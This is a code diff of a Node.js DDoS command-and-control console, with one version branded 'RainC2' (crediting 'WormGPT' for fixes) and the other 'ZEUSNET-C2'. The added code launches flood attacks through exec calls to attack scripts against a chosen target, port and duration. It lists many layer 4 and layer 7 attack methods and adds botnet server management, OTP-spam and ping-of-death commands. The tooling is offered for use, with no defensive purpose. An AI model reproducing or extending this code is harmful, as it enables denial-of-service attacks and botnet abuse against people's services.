+⢀⣿⡿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠋⠁⠀⠀⠀⠀⠀⠀⠈⠃
+⠸⠁⢀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⣿⣿⣿⡿⣿⣿⣿⣿⣿⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠹⣿⣿⡇⠈⠻⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠈⠻⡇⠀⠀⠈⠙⠿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+${bold}${cyan}DeathPing Flood Attack Launched${Reset}
+========================================================================
+${bold}${cyan}STATUS${Reset}   : \x1b[94mAttack Has Successfully Launched\x1b[0m
+${bold}${cyan}Target${Reset}   : ${target}
+${bold}${cyan}Duration${Reset} : ${duration}
+${bold}${cyan}Methods  : DeathPing Flood${Reset}
+${bold}${cyan}Owner Tools  : @STEVENC2${Reset}`)
+} catch (error) {
+  console.log(`Oops Something Went Wrong`)
+}
+
+const metode = path.join(__dirname, `/lib/cache/tcp.js`);
+const sadboy = path.join(__dirname, `/lib/cache/sadboy.js`);
+exec(`node ${metode} ${target} ${port} ${duration} 10`)
+exec(`node ${sadboy} http://${target} ${duration}`)
+sigma()
+};
+// ================================================== //
+async function subdomen(args) {
+  if (args.length < 1) {
+    console.log(`Example: Subdo-Finder Domain
+Subdo-Finder starsx.tech`);
+    sigma();
+	return
+  }
+const [domain] = args
+try {
+let response = await axios.get(`https://api.agatz.xyz/api/subdomain?url=${domain}`);
+let hasilmanuk = response.data.data.map((data, index) => {
+return `${data}`;
+}).join('\n');
+console.clear()
+console.log(`
+⠀⠀⠀⠀⠀⠀⣠⣴⣾⣿⣿⣿⣿⣿⣿⣶⣤⣄⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣄⠀⠀⠀⠀⠀
+⠀⠀⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣆⠉⠉⢉⣿⣿⣿⣷⣦⣄⡀⠀
+⠀⠚⢛⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡄
+⠀⢠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠿⠿⠿⠿⣿⡇
+⢀⣿⡿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠋⠁⠀⠀⠀⠀⠀⠀⠈⠃
+⠸⠁⢀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⣿⣿⣿⡿⣿⣿⣿⣿⣿⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠹⣿⣿⡇⠈⠻⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠈⠻⡇⠀⠀⠈⠙⠿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+${bold}${cyan}Subdomains Finder${Reset}
+Type ${bold}${biru}"Cls"${Reset} To Clear Terminal
+========================================================================
+${hasilmanuk}`)
+} catch (error) {
+  console.log(`Oops Something Went Wrong`)
+  sigma()
+}
+sigma()
+};
+// ================================================== //
+async function chat_ai() {
+steven.question('[\x1b[1m\x1b[95m Chat AI\x1b[0m]: \n', async (yakin) => {
+if (yakin === 'exit') {
+  console.log(`Chat Ai Has Ended`)
+  sigma()
+} else {
+  try {
+let skidie = await axios.get(`https://widipe.com/gpt4?text=${yakin}`)
+let kiddies = await skidie.data
+console.log(`
+[ ZEUSNET-C2 ]:
+${kiddies.data}
+`)
+  } catch (error) {
+      console.log(error)
+  }
+  chat_ai()
+}})
+}
+// [========================================] //
 async function sigma() {
-const getNews = await fetch(`https://raw.githubusercontent.com/permenmd/cache/main/news.txt`)
+const getNews = await fetch(`https://raw.githubusercontent.com/StevenBisnis22/cache/refs/heads/main/news.txt`)
 const latestNews = await getNews.text();
 const creatorCredits = `
-Created By Gwyn/Stevee
-Thanks to WormGPT for fixing this code
-`
+⠀⠀⠀⠀⠀⠀⣠⣴⣾⣿⣿⣿⣿⣿⣿⣶⣤⣄⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣄⠀⠀⠀⠀⠀
+⠀⠀⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣆⠉⠉⢉⣿⣿⣿⣷⣦⣄⡀⠀
+⠀⠚⢛⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡄
+⠀⢠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠿⠿⠿⠿⣿⡇
+⢀⣿⡿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠋⠁⠀⠀⠀⠀⠀⠀⠈⠃
+⠸⠁⢀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⣿⣿⣿⡿⣿⣿⣿⣿⣿⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠹⣿⣿⡇⠈⠻⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠈⠻⡇⠀⠀⠈⠙⠿⣿
+====================================================================
+Created And Coder Full By @STEVENC2`
+steven.question(
+'\x1b[91mZ\x1b[93mE\x1b[92mU\x1b[96mS\x1b[94mN\x1b[95mE\x1b[97mT\x1b[91m-\x1b[93mC\x1b[92m2\x1b[0m ', (input) => {
+    const [command, ...args] = input.trim().split(' ');
 
-permen.question(
-  chalk.bgWhite.red('RainC2') + chalk.reset(' > '),
-  (input) => {
-    const [command, ...args] = input.trim().split(/\s+/);
-
-
-if (command === 'help') {
+  if (command === 'help') {
     console.log(`
-NAME       │ ALIAS            │ DESCRIPTION
-───────────┼──────────────────┼─────────────────────────────────
-methods    │ ---              │ Show methods L7/4
-monitor    │ ---              │ Show ongoing attack monitor
-credits    │ ---              │ Show creator of these tools
-cls        │ ---              │ Clear terminal screen
-botnet     | ---              | Botnet Attack
-addsrv     | ---              | Add Server To Botnet
-testsrv    | ---              | Checking Your Botnet's Srv
-botnet-mt  | ---              | Botnet Methods
+NAME      │ ALIAS              │ DESCRIPTION
+──────────┼────────────────────┼────────────────────────────────────
+ help     │ ----               │ Melihat Semua Command
+ methods  │ ----               │ Melihat Semua Methods
+ botnet-methods | ----         | Melihat Semua Methods Botnet
+ proxy    | ----               | Update Proxy Pada Tools ZEUSNET-C2
+ track-ip | ----               | Track Ip Address With Info
+ subdo-finder │ ----           | Find All Subdomain From Domain
+ ongoing  │ ----               │ Melihat Server Serangan Anda
+ tutorial │ ----               │ Tutorial Penggunaan Tools ZEUSNET-C2
+ credits  │ ----               │ Credits Tools ZEUSNET-C2
+ news     │ ----               │ Melihat News Update Tools ZEUSNET-C2
+ cls      | ----               | Clear Terminal Tools ZEUSNET-C2
+`);
+    sigma();
+  } else if (command === 'botnet-methods') {
+  	console.log(`
+█░░ ▄▀█ █▄█ █▀▀ █▀█ ▀▀█     
+█▄▄ █▀█ ░█░ ██▄ █▀▄ ░░█ 
 
-                  
+──────────────────────[SERVER OPERATIONS]──────────────────────
+   • botnet       - Launch Attack With Server
+   • botnet-test  - Check Server Status
+   • addsrv      - Add New Server
+┌────────────────────────────┐
+│         Attack Modes       │
+├────────────────────────────┤
+│ ➤ zeus-flood         │ ➤ zeus-tls    │
+│ ➤ zs-browser         │ ➤ zs-bypass   │ 
+│ ➤ zeus-flash         │ ➤ zeus-love   │
+│ ➤ zeus-raw           │ ➤ zeus-sad    │
+└────────────────────────────┘
+
 `);
     sigma();
   } else if (command === 'methods') {
+    methods()
+    sigma();
+  } else if (command === 'proxy') {
+    exec('node ./tools/scrape.js', (error, stdout, stderr) => {
+        if (error) {
+            console.error(`Error: ${error.message}`);
+            return;
+        }
+        if (stderr) {
+            console.error(`stderr: ${stderr}`);
+            return;
+        }
+        console.log(`stdout: ${stdout}`);
+    });
+    
+    sigma();
+  } else if (command === 'news') {
     console.log(`
-
-NAME       │ DESCRIPTION                                 │ DURATION
-───────────┼─────────────────────────────────────────────┼────────────
-glory      │ Layer 7 - Attack URL 
-flood      │ Layer 7 - Attack URL
-storm      │ Layer 7 - Attack URL 
-ninja      │ Layer 7 - Attack URL
-thunder    │ Layer 7 - Attack URL
-https      │ Layer 7 - Attack URL
-httpx      │ Layer 7 - Attack URL
-bypass     │ Layer 7 - Attack URL 
-h2         │ Layer 7 - Attack URL 
-cf         │ Layer 7 - Attack URL 
-xyn        │ Layer 7 - Attack URL 
-blast      │ Layer 7 - Attack URL 
-uam        │ Layer 7 - Attack URL 
-maklo      | Layer 7 - Attack URL
-raw        │ Layer 7 - Attack URL 
-quantum    │ Layer 7 - Attack URL
-h2-meris   │ Layer 7 - Attack URL
-h2-raw     | Layer 7 - Attack URL
-cibi       | Layer 7 - Attack URL
-fire       | Layer 7 - Attack URL
-browser    │ Layer 7 - Attack URL
-tls        │ Layer 7 - Attack URL
-pidoras    │ Layer 7 - Attack URL
-thspeed    │ Layer 7 - Attack URL
-udp        │ Layer 4 - Attack Ip port
-tcp        │ Layer 4 - Attack Ip port
-
-               \x1b[36m𝐕𝐨𝐫𝐭𝐞𝐗𝐄𝐱𝐞𝐂𝐮𝐭𝐢𝐨𝐧𝐕𝐚𝐮𝐥𝐭\x1b[0m              
-`);
+${latestNews}`);
     sigma();
   } else if (command === 'credits') {
     console.log(`
 ${creatorCredits}`);
     sigma();
-  } else if (['tls', 'glory', 'flood', 'pidoras', 'thunder', 'bypass', 'strom', 'thspeed', 'h2', 'xyn', 'uam', 'blast', 'raw', 'quantum', 'browser','h2-raw','cibi','maklo','fire','cf','ninja','h2-meris'].includes(command)) {
-    handleAttackCommand([args[0], args[1], command]);
-} else if (['tcp', 'udp'].includes(command)) {
-  if (args.length < 3) {
-    console.log(`Example usage: <methods> <ip> <port> <duration>`);
+  } else if (command === 'gataulah') {
+    handleAttackCommand(args);
+  } else if (command === 'tutorial') {
+  	console.log(`
+ Tutorial Menggunakan
+ Methods Target Port Time
+ Contoh => Zeus-Tls https://website.com 443 60`);
     sigma();
-    return;
-  }
-
-  const target = args[0];
-  const port = args[1];
-  const duration = args[2]; 
-  handleAttackL4([target, port, duration, command]); 
-  } else if (command === 'monitor') {
-  monitorOngoingAttacks();
-    sigma();
-  } else if (command === 'clear') {
+  } else if (command === 'udp') {
+    udp(args);
+  } else if (command === 'tcp') {
+    tcp(args);
+  } else if (command === 'zeus-flood') {
+  	zeus_flood(args);
+  } else if (command === 'zeus-tls') {
+  	zeus_tls(args);
+  } else if (command === 'zs-browser') {
+  	zs_browser(args);
+  } else if (command === 'zs-bypass') {
+  	zs_bypass(args);
+  } else if (command === 'zeus-flash') {
+  	zeus_flash(args);
+  } else if (command === 'zeus-love') {
+  	zeus_love(args);
+  } else if (command === 'zeus-raw') {
+  	zeus_raw(args);
+  } else if (command === 'zeus-sad') {
+  	zeus_sad(args);
+  } else if (command === 'kill-do') {
+  	killDo(args);
+  } else if (command === 'samp') {
+  	samp(args);
+  } else if (command === 'subdo-finder') {
+    subdomen(args)
+  } else if (command === 'kill-otp') {
+  	killOTP(args);
+  } else if (command === 'DeathPing') {
+  	DeathPing(args);
+  } else if (command === 'spampair') {
+  	SpamPair(args);
+  } else if (command === 'kill-ping') {
+    pod(args);
+    } else if (command === 'addsrv') {
+    processBotnetEndpoint(args);
+  } else if (command === 'botnet-test') {
+    checkBotnetEndpoints()
+  } else if (command === 'botnet') {
+    AttackBotnetEndpoints(args);
+  } else if (command === 'ongoing') {
+    ongoingAttack()
+    sigma()
+  } else if (command === 'track-ip') {
+    trackIP(args);
+  } else if (command === 'mc') {
+    mc(args);
+  } else if (command === 'ai') {
+    console.log(`STEVENC2 Ai ZEUSNET-C2 Started
+Type "Exit" To Stop Chat`);
+    chat_ai()
+  } else if (command === 'cls') {
     banner()
     sigma()
-  } else if (command === 'addsrv') {
-    processBotnetEndpoint(args)
-    sigma()
-  } else if (command === 'testsrv') {
-    checkBotnetEndpoints()
-    sigma()
-  } else if (command === 'botnet') {
-    AttackBotnetEndpoints(args)
-    sigma()
-  } else if (command === 'botnet-mt') {
-    console.log(`
-──────────────────────────────
-► VIP
-     - raw      │  - strike
-     - httpx    │  - storm
-     - tls      │  - bypass
-     - browser  |  - fire
-     - nuke     │  - h2-meris
-     - java     │  - h2
-     - glory    |  - h2-raw
-     - flood    │  - ninja
-     - storm    │  - cibi
-──────────────────────────────
-`);
-    sigma();
     } else {
     console.log(`${command} Not Found`);
     sigma();
